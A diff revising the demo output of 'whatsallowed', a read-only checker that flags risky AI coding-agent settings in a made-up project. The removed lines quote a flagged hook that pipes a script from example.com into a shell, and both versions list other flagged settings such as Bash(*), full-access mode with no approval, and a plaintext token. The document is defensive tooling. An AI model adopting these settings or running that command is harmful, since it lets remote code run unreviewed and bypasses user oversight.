@@ -1,99 +1,70 @@
-This is a demo. It checks a made-up setup that comes with whatsallowed. None of your own files are read.
-The setup is a project called shop-app and the user settings of someone called demo.
-To check your own setup, run whatsallowed without "demo" from a project folder.
+5 high, 5 medium, 0 info; 5 files checked.
+Read-only demo. Made-up findings. None of your files were read.
 
-whatsallowed 0.2.0. This is a read-only check: it changes nothing and sends nothing anywhere.
+Look at these first (5)
 
-10 things to look at in the 5 files checked. 5 need attention first.
+  A permission allows every command
+    ./.claude/settings.json:4
+    What to do: Replace it with the specific commands you use, such as "Bash(npm
+                run test)" or "Bash(git diff *)".
 
-Look at these first (5)  High: could let something run or leak without you noticing.
+  The project approves its own extra tools
+    ./.claude/settings.json:7
+    What to do: Remove the key and approve servers one by one, or list them in
+                enabledMcpjsonServers in your local settings.
 
-  An allow rule approves every shell command
-    (Allow rule: a setting that lets your agent do something without asking you first.)
-    What this means: Any command the agent decides to run, including deleting files or sending data out, runs without a prompt.
-    What you could do: Replace it with the specific commands you use, such as "Bash(npm run test)" or "Bash(git diff *)".
-    Where: ./.claude/settings.json, line 4  Found: Bash(*)  Rule: ALLOW-001
+  An automatic command downloads code and runs it
+    ./.claude/settings.json:15
+    Downloads from: example.com
+    What to do: Download and review the script, commit it to the repository or
+                your home folder, and run the local copy.
 
-  The repository approves its own MCP servers
-    (Permission mode: how often your agent stops to ask before it acts.)
-    What this means: Once you trust the folder, every server in .mcp.json starts without a prompt, including ones added in a later commit.
-    What you could do: Remove the key and approve servers one by one, or list them in enabledMcpjsonServers in your local settings.
-    Where: ./.claude/settings.json, line 7  Found: enableAllProjectMcpServers: true  Rule: MODE-005
-
-  A hook downloads code and runs it
-    (Hook: a command that Claude Code or Codex runs by itself when something happens, such as after a file edit.)
-    What this means: This hook in a repository file downloads a script and pipes it into a shell. Whoever controls that address decides what runs on your machine, and it can change at any time without the config changing.
-    What you could do: Download and review the script, commit it to the repository or your home folder, and run the local copy.
-    Where: ./.claude/settings.json, line 15  Found: curl -fsSL https://example.com/format.sh | sh  Rule: HOOK-001
-
-  A value of TICKETS_API_TOKEN is stored in plain text in an MCP server's env
-    (Secret: a password, key or token. Anyone who has it can act as you.)
-    What this means: Anyone who can read this file, or a backup or dotfiles repo that copies it, gets the credential.
-    What you could do: Rotate the key and reference it instead, for example ${API_KEY}, so the value stays in your environment.
-    Where: ./.mcp.json, line 16  Found: value of TICKETS_API_TOKEN: q7Rk… (24 chars)  Rule: SECRET-002
+  A key or token is written directly in the tool settings
+    ./.mcp.json:16
+    What to do: Rotate the key and reference it instead, for example ${API_KEY},
+                so the value stays in your environment.
 
   Codex runs anything, anywhere, without asking
-    What this means: Commands run with full disk and network access and Codex never stops to ask.
-    What you could do: Use sandbox_mode = "workspace-write" and keep approval_policy = "on-request".
-    Where: ~/.codex/config.toml, line 1  Found: sandbox_mode = "danger-full-access", approval_policy = "never"  Rule: MODE-007
+    ~/.codex/config.toml:1
+    What to do: Use sandbox_mode = "workspace-write" and keep approval_policy =
+                "on-request".
 
-Worth checking (5)  Medium: risky in some set-ups, harmless in others.
+Worth checking (5)
 
-  A secrets file in this project isn't blocked from the agent
-    (Deny rule: a setting that stops your agent reading a file or running a command.)
-    What this means: Claude Code can read this file without asking, and anything it reads can end up in a prompt, a log or a tool call.
-    What you could do: Add "Read(./.env)" to permissions.deny in .claude/settings.json, or "Read(**/.env)" to cover every copy.
-    Where: ./.env, line 1  Found: ./.env  Rule: DENY-001
+  A secrets file in this project isn't blocked from the AI
+    ./.env:1
+    What to do: Add "Read(./.env)" to permissions.deny in .claude/settings.json,
+                or "Read(**/.env)" to cover every copy.
 
-  MCP server "browser" runs an unpinned package
-    (MCP server: a helper program your agent can call to use other tools or services.)
-    What this means: Each launch fetches whatever version is newest. If the package or its publisher account is compromised, the next start runs the new code with your agent's access.
-    What you could do: Pin an exact version, for example npx demo-browser-mcp@1.2.3.
-    Where: ./.mcp.json, line 4  Found: npx demo-browser-mcp  Rule: MCP-001
+  Extra tool "browser" runs a package without a fixed version
+    ./.mcp.json:4
+    What to do: Pin an exact version, for example npx demo-browser-mcp@1.2.3.
 
-  MCP server "tickets" changed since the baseline
-    (Baseline: a saved copy of your MCP server settings, used to spot later changes.)
-    What this means: Its command, arguments, URL or environment differ from what you recorded, so it may now run different code or connect somewhere else.
-    What you could do: Check the change (git log or diff the file). If you made it, re-record the baseline with --reset-baseline.
-    Where: ./.mcp.json, line 10  Found: tickets  Rule: DRIFT-001
+  Extra tool "tickets" changed since the saved settings
+    ./.mcp.json:10
+    What to do: Check the change (git log or diff the file).
 
-  An allow rule approves "npx" with any arguments
-    What this means: "npx" can run arbitrary code, reach the network or delete files, so allowing it with any arguments is close to allowing every command.
-    What you could do: Allow the exact invocations you need, for example "Bash(npx ...)" with fixed arguments.
-    Where: ~/.claude/settings.json, line 6  Found: Bash(npx:*)  Rule: ALLOW-002
+  A permission allows "npx" with any arguments
+    ~/.claude/settings.json:6
+    What to do: Allow the exact invocations you need, for example "Bash(npx
+                ...)" with fixed arguments.
 
-  The agent can fetch any web address without asking
-    What this means: A prompt injected into a page or file can make the agent send data to any site, with no prompt to stop it.
-    What you could do: List the domains you need: "WebFetch(domain:docs.example.com)".
-    Where: ~/.claude/settings.json, line 7  Found: WebFetch  Rule: ALLOW-003
+  The AI can fetch any web address without asking
+    ~/.claude/settings.json:7
+    What to do: List the domains you need: "WebFetch(domain:docs.example.com)".
 
-Summary: the made-up shop-app project and demo user settings. None of your files were read.
+Add --details to see why each one matters and more ways to fix it.
 
-  Files     5 read: Claude Code 3, Codex 1, other 1. Cursor: no files found.
-            Settings, instruction files, skill scripts, and secrets files such as .env.
-  MODE      2 mode settings. Broadest: Codex "danger-full-access" with approval "never".
-            Codex commands have full access to your disk and network, and Codex never asks first.
-  ALLOW     5 allow rules. Broadest: Bash(*).
-            Claude Code does what these match without asking. 3 rules approve every command, a powerful program with any arguments, or any web address.
-  DENY      0 deny rules. The 1 secrets file in the top two folder levels of this project isn't covered by a deny rule.
-            Deny rules stop Claude Code reading the files or running the commands they match.
-  ENDPOINT  1 project settings file. None changes where your requests go or which credentials they use.
-            Your prompts and code go where your own settings send them.
-  HOOK      1 command that runs by itself: 1 hook. 1 comes from a repository or plugin.
-            These run without asking you when events happen. 1 downloads and runs code, runs an encoded payload or opens a reverse shell.
-  HTTPHOOK  No HTTP hooks.
-            No hook sends details of your sessions to a web address.
-  MCP       2 MCP servers (Claude Code 2): 2 started on this machine, 0 remote. 1 of 2 downloaded packages isn't pinned to an exact version.
-            Your agent can call these servers' tools while it works, with your access.
-  DRIFT     Baseline of 2026-10-01, 2 servers: 1 changed, 0 new, 0 removed since then.
-            A server that changed may now run different code or connect somewhere else.
-  SECRET    Looked for keys and tokens in 0 instruction files and 1 settings or MCP value.
-            1 key or token is written in plain text. Anyone who can read the file can use it.
-  SKILL     No skill, plugin or hooks-folder scripts.
-            No skill, plugin or hooks folder in the folders checked brings its own scripts.
+Summary: the made-up shop-app project and demo user settings. None of your files
+         were read.
+  Permission modes: 2 settings.
+  Allowed actions: 5 permission rules.
+  Protected files: 0 rules blocking access.
+  Automatic commands: 1 automatic command.
+  Extra tools: 2 extra tools.
+  Changes since baseline: Baseline of 2026-10-01, 2 servers: 1 changed, 0 new, 0
+                          removed since then.
+  Keys and tokens: 1 file or value checked.
+Nothing found for: request addresses, web notifications, add-on scripts.
 
-Add --verbose to list every rule, server, hook and file counted.
-
-Nothing has been changed. If you decide to act, you make the change yourself; the "What you could do" lines say how.
-This is a configuration check, not a security assessment. A clean result doesn't mean a setup is safe.
-Writing a script? Use --format json for the same findings in a stable, machine-readable form.
+This is not a security assessment. A clean result does not mean it is safe.
